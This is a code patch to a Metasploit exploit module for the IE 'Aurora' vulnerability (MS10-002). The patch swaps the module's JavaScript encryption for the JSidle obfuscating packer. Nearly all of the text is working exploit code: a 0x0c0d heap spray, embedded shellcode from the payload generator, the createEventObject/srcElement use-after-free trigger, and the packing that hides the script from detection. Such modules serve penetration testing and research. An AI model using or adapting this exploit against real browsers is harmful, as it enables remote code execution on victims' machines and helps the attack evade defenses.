@@ -1,0 +1,117 @@
+Index: modules/exploits/windows/browser/ms10_002_aurora.rb
+===================================================================
+--- modules/exploits/windows/browser/ms10_002_aurora.rb	(revision 9725)
++++ modules/exploits/windows/browser/ms10_002_aurora.rb	(working copy)
+@@ -10,6 +10,7 @@
+ ##
+ 
+ require 'msf/core'
++require 'rex/exploitation/jsidle'
+ 
+ class Metasploit3 < Msf::Exploit::Remote
+ 	Rank = NormalRanking
+@@ -75,7 +76,7 @@
+ 			'DisclosureDate' => 'Jan 14 2009', # wepawet sample
+ 			'DefaultTarget'  => 0))
+ 
+-		@javascript_encode_key = rand_text_alpha(rand(10) + 10)
++		@packer = Rex::Exploitation::JSidle.new(:static => false)
+ 	end
+ 
+ 	def on_request_uri(cli, request)
+@@ -87,68 +88,55 @@
+ 		end
+ 
+ 		if (!request.uri.match(/\?\w+/))
+-			send_local_redirect(cli, "?#{@javascript_encode_key}")
++			send_local_redirect(cli, "?#{@packer.qstring_key}")
+ 			return
+ 		end
+ 
+-		var_boom       = rand_text_alpha(rand(100) + 1)
+-
+-		var_element    = rand_text_alpha(rand(100) + 1)
+-		var_event      = rand_text_alpha(rand(100) + 1)
++		var_span_id    = rand_text_alpha(rand(100) + 1)
++		var_start      = rand_text_alpha(rand(100) + 1)
+ 		var_loaded     = rand_text_alpha(rand(100) + 1)
+-		var_loaded_arg = rand_text_alpha(rand(100) + 1)
+ 
+-		var_memory     = rand_text_alpha(rand(100) + 1)
+-		var_spray      = rand_text_alpha(rand(100) + 1)
+-		var_i          = rand_text_alpha(rand(100) + 1)
+-
+-		var_el_array   = rand_text_alpha(rand(100) + 1)
+ 		bleh           = rand_text_alpha(3);
+-		var_grab_mem   = rand_text_alpha(rand(100) + 1)
+ 
+-		var_unescape   = rand_text_alpha(rand(100) + 1)
+-		var_shellcode  = rand_text_alpha(rand(100) + 1)
+-
+-		var_span_id    = rand_text_alpha(rand(100) + 1)
+-		var_start      = rand_text_alpha(rand(100) + 1)
+-		rand_html      = rand_text_english(rand(400) + 500)
+-
+-		js = %Q|var #{var_element} = "COMMENT";
+-var #{var_el_array} = new Array();
++		js = %Q|var element = "COMMENT";
++var el_array = new Array();
+ for (i = 0; i < 1300; i++)
+ {
+-#{var_el_array}[i] = document.createElement(#{var_element});
+-#{var_el_array}[i].data = "#{bleh}";
++el_array[i] = document.createElement(element);
++el_array[i].data = "#{bleh}";
+ }
+-var #{var_event} = null;
+-var #{var_memory} = new Array();
+-var #{var_unescape} = unescape;
+-function #{var_boom}()
++var event2 = null;
++var memory = new Array();
++var unescape = unescape;
++function boom()
+ {
+-var #{var_shellcode} = #{var_unescape}( '#{Rex::Text.to_unescape(regenerate_payload(cli).encoded)}');
+-var #{var_spray} = #{var_unescape}( "%" + "u" + "0" + "c" + "0" + "d" + "%u" + "0" + "c" + "0" + "d" );
+-do { #{var_spray} += #{var_spray} } while( #{var_spray}.length < 0xd0000 );
+-for (#{var_i} = 0; #{var_i} < 150; #{var_i}++) #{var_memory}[#{var_i}] = #{var_spray} + #{var_shellcode};
++var shellcode = unescape( '#{Rex::Text.to_unescape(regenerate_payload(cli).encoded)}');
++var spray = unescape( "%u0c0d%u0c0d" );
++do { spray += spray } while( spray.length < 0xd0000 );
++for (i = 0; i < 150; i++) memory[i] = spray + shellcode;
+ }
+-function #{var_loaded}(#{var_loaded_arg})
++function #{var_loaded}(loaded_arg)
+ {
+-#{var_boom}();
+-#{var_event} = document.createEventObject(#{var_loaded_arg});
++boom();
++event2 = document.createEventObject(loaded_arg);
+ document.getElementById("#{var_span_id}").innerHTML = "";
+-window.setInterval(#{var_grab_mem}, 50);
++window.setInterval(grab_mem, 50);
+ }
+-function #{var_grab_mem}()
++function grab_mem()
+ {
+ p = "\\u0c0f\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d";
+-for (i = 0; i < #{var_el_array}.length; i++)
++for (i = 0; i < el_array.length; i++)
+ {
+-#{var_el_array}[i].data = p;
++el_array[i].data = p;
+ }
+-var t = #{var_event}.srcElement;
++var t = event2.srcElement;
+ }
+ |
+-		js_encoded = encrypt_js(js, @javascript_encode_key)
+ 
++		@packer.js = js
++		res = @packer.pack()
++		js_encoded = res[:js_encoded]
++
+ 		html = %Q|<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN">
+ <html>
+ <head>
